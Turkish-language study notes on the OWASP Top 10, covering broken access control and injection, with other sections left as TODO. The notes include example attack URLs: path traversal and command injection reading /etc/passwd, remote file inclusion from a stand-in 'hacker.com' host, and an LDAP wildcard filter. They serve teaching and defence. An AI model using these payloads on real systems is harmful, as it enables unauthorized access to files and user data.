# İçerik
- [x] A01: Broken Access Control
- [ ] A02: Cryptographic Failures
- [ ] A03 Inejcttion
- [ ] A04 Insecure Design
- [ ] A05 Security Misconfiguration
- [ ] A06 Vulnerable and Outdated Components
- [ ] A07 Identification and Authentication Failures 
- [ ] A08 Software and Data Integrity Failures
- [ ] A09 Security Logging and Monitoring Failures
- [ ] A10 Server Side Request Forgery (SSRF)

--- 

# A01:2021 -  Bozuk Erişim Kontrolü ( Broken Access Control)
Erişim kontrolü kullanıcıların yetkileri dışına çıkmamalarını sağlamaktadır. Yetkisiz kullanıcının, yetkisi dışında gerçekleştirebildiği işlemler bu güvenlik açığını ortaya çıkarmaktadır. Erişim denetimleri birçok yöntem ile bypass edilebilmektedir. **Authentication** (kimlik doğrulama) ve **Authorization** (yetkilendirme), konuyla ilgili çnemli kavramlardır. Kimlik doğrulama, kullanıcının kim olduğunun doğrulandığı işlemdir. Yetkilendirme işlemi ise kullanıcının kimliğine göre yetkilerin kontrol edilmesidir. Erişim kontrolü, kullanıcının gerçekleştireceği işlemi yapıp yapamayacağını belirlemektedir. Erişim Denetim Türleri üç kategoride incelenebilmektedir.
	1. Vertical Access Control (Dikey Erişim Kontrolü): Bu kontrol mekanizmasında, normal kullanıcıların yönetici izinlerini kullanmasına izin vermez.Kullanıcı türüne göre yetkilendirme yapılabilir.
	2. Horizontal Access Control (Yatay Erişim Kontrolü):  Kullanıcıların kaynakları ayrıdır. Bir kullanıcı başka bir kullanıcının kaynaklarına ve yetkilerine erişim sağlayamaz.
	3. Context-Dependent Access Control (Bağlamsal Erişim Kontrolü): Kullanıcının gerçekleştiği işlemlerin sırasına göre yetkilendirme işlemi gerçekleşmektedir. Örneğin, kullanıcı sepetine ürün ekleme/çıkarma gibi işlemleri gerçekleştirebilir. Ödeme yapıldıktan sonra satın aldığı ürünleri değiştirememesi gerekir.

<mark style="background-color: red">Güvenlik açıklıkları</mark>
- URL veya HTML sayfasında değişiklik yapma, API isteklerini düzenleme 
- Başka  bir kullanıcıya ait eşsiz id ile hesap üzerinde düzenleme yapabilme, IDOR zafiyeti (insecure direct object references)
- Yetki yükselterek admin haklarına sahip olma veya giriş yapmadan varsayılan kullanıcı haklarına sahip olma
- Metadata manipülasyonları, JSON Web Token geçersizleştirme
- CORS(Cross Origin Resource Sharing) konfigurasyonlarının eksik yapılması. CORS, istekleri farklı domain(etki alanına) göndermeyi sağlayan yapıya denir. 

<mark style="background-color:lightgreen">Önlemler</mark>
Erişim kontrolü, sunucu tarafının güvenilir olmasıyla veya server-less(sunucusuz) API kullanımı ile kullanışlı durumdadır.Erişim kontolü olası güvenlik saldırılara karşı,
- Erişim kontrol hataları loglanması
- Web sunucu dizinlerini devre dışı bırakmak yedekleme dosyalarını bu dizinde bulundurmamak
- Durum bilgisini içeren tanımlayıcılar oturum kapatıldıktan sonra geçersiz duruma gelmelidr. Durum bilgisi taşımayan JWT tokenleri geçerlilik süreleri kısa tutulmalı
- Her istekte izinlerin doğrulanması
- Erişim izinlerinin varsayılan olarak kapalı olması 
- Bağlantı adresi içerisindeki id parametresi değiştirilemese bile erişilmez olması gerekmektedir.
- 

Note:
JWT(JSON Web Token) json objelerini kullanarak uygulama ve kullanıcı arasında güvenli veri taşımayı sağlar ve taşıdığı verinin bütünlüğünü doğrulayabilmektedir.Oturum yönetimi için kullanılır. Giriş yapan her kullanıcı tokene sahiptir böylece hangi izinlere sahip olduğu içerisinde  belirtilir. Brute force yöntemini kullanarak dizin listeleme yaparak token doğrulama,XXE, CSRF saldırıları ile anahtar değeri sızdırılabilir. JWT, başlık, payload, imza şeklinde 3 parçadan oluşur ve encode edilmiş haldedir. https://jwt.io/ sitesinde örnek gösterimi bulunmaktadır.

<mark>Örnek Saldırı Senaryoları</mark>

- Uygulama içerisinde hesap bilgilerine erişilen kısımda doğrulanmamış verilerin kullanılması, tehdit aktörünün bağlantı adresindeki id parametresini değiştirerek herhangi bir hesaba erişmesine neden olabilir. 
- Admin sayfasına erişim sağlayabilmesi (örneğin, `https://target.com/admin` gibi)
- Directory Traversal File Include (Dizin veya dosya yolu geçişi) yani, bağlantı adresi ile sunucu içerisindeki dosyaya erişim sağlamak. Yerel ve uzaktan dosya dahil etme olarak iki türlü gerçekleşebilmektedir. LFI(Local File Inclusion), sunucu içerisinde yani yerelde bulunan dosyaları okuyabilme ve içeriğine erişebilme işleminin gerçekleşmesidir. Örneğin,  `http://example.com/getUserProfile.jsp?item=../../../../etc/passwd` şeklinde yapılan aramada kullanıcıların giriş bilgilerini tutan dosyaya erişim sağlanabilir eğer LFI zafiyeti bulunuyorsa. RFI(Remote File Inclusion), zafiyetinde ise uzak sunucudan dosya yüklenebilmesi ve çalıştırılmasıdır. Örnek olarak `http://example.com/index.php?file=http://hacker.com/malicious.txt` . Tehdit aktörü, sunucu içerisine hacker.com adresinden malicious.txt isimli dosyayı yüklemektedir. Atlatma yöntemlerinde encoding işlemleri de gerçekleşmektedir.



<mark style="background: lightblue">İlgili CWE Sayısı</mark>
34 tanedir

---
# A02:2021 Cryptographic Failures (Kriptografik Hatalar)

- [ ] TODO

---
# A03:2021 Injection

<mark style="background-color: red">Güvenlik açıklıkları</mark>
Injection zafiyeti, kullanıcıdan gelen girdinin kontrol edilmemesinden kaynaklanmaktadır. Kötü amaçlı kullanıcı SQL sorgusu, zararlı komutlar çalıştırabilir veya zararlı dosya yüklemesi ile uzaktan komut çalıştırabilir. Bunun gibi birçok saldırı senaryoları bulunmaktadır.  Injection çeşitleri olarak,
- **SQL injection:** Kullanıcı tarafından uygulamada bulunan veri girdisinde SQL sorgu cümlesinin enjekte edilmesi veya çalıştırılabilmesidir. Bu işlem sonucunda, veritabanı içerisinden hassas bilgilere erişilebilir, içeriği değiştirebilir. Böylece veri bütünlüğü bozulmuş olur.  
- **OS command injection:** Web sunucusu üzerinde işletim sistemi komutlarının çalıştırılabilmesidir. Bu sayede zararlı aktiviteler gerçekleştirilebilir, işletim sistemi içerisindeki şifre gibi hassas bilgilere ulaşabilir. Url sonuna `%3B` yani komut ayırıcı olarak kullanılan  `;` işareti eklenir . Örneğin, `http://sensitive/something.php?dir=%3Bcat%20/etc/passwd` . Bu istek sonucunda istenen dosya içeriğine ulaşılabiliyorsa bu zafiyet meydana gelmiştir. Bu gibi hassas işletim sistemi komutlarının tespiti gerçekleşebilmektedir. 
- LDAP Injection: kullanıcının girdisine bağlı olarak LDAP ifadelerin oluşmasıdır. Kullanıcının hesabının doğrulanması için LDAP kullanılması ve LDAP sorgularının güvenli olmaması bu iki faktör LDAP injection güvenlik açığına neden olmaktadır. LDAP sorguları SQL sorgulara benzetilmektedir. LDAP protokolü, kullanıcı hakkında bilgileri depolamaktadır. Sunucu tarafından gerçekleşen saldırı türüdür(server-side attack). Web uygulamaları kullanmaktadır. Başarılı gerçekleşen LDAP injection saldırısında LDAP arama  filtreleri metakarakerler uygulama içerisinde çalıştırılarak LDAP'ın depoladığı kullanıcı bilgilerine erişim sağlanabilir veya değiştirilebilir. Örneğin, yapılan http isteği şu şekilde olsun `http://www.example.com/ldapsearch?user=John` , John yerine  `*` işaretini koyarsak, arama filtresi  `searchfilter="(cn=*)"` böyle olur ve uygulamaya göre kaydedilen  tüm kullanıcı bilgilerine erişim sağlanabilir.  `cn` , `uid` , `homeDirectory`  gibi  paramtereler ile hangi dizinde olduğu bile öğrenilebilir.


<mark style="background-color:lightgreen">Önlemler</mark>
Injection zafiyetinin önlenmesi için, 
- Geliştirilen uygulama içerisinde veri girişlerinin bazı araçlar ile test edilmesi
- Verilerin sunucu tarafında doğrulamasının yapılması  
- Veritabanı sorguları için özel karakterlerden kaçınılması
- LDAP için tüm değlerden kaçınarak LDAP encoding işleminin yapılması. OWASP ZAP bu zafiyeti otomatik olarak tespit edebilmektedir.
- Kullanıcı girdi doğrulaması yapılırken tehlikeli olabilen  `& | ; $ > < \  ` gibi işaretlerin içermediği izin verilen karakterler listesi kullanılabilir. Kullanıcıdan istenen girdiye göre harf veya sayı ile sınırlandırılabilir ayrıca girdinin karakter sayısı aralığı da belirlenerek injection riski azaltılabilir.

<mark>Örnek Saldırı Senaryoları</mark>

- [ ] TODO:

---

# A04: Insecure Design

- [ ] TODO

---
# Kaynak 
- [OWASP TOP 10](https://owasp.org/Top10/)
* [JWT Nedir?](https://medium.com/bili%C5%9Fim-hareketi/json-web-tokens-jwt-nedir-4d10c7e692f4)
* [JWT Nedir, Güvenlik Kontrolleri Nasıl Yapılandırılır?](https://medium.com/trendyol-tech/jwt-nedir-g%C3%BCvenlik-kontrolleri-nas%C4%B1l-yap%C4%B1l%C4%B1r-3421ebc33989)
* [Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [A Comprehensive Guide to Broken Access Control](https://www.prplbx.com/resources/blog/broken-access-control/)
* [Local File İnclusion Nedir ?](https://murat-mdk64.medium.com/local-file-i%CC%87nclusion-nedir-9afd23473405)
* 


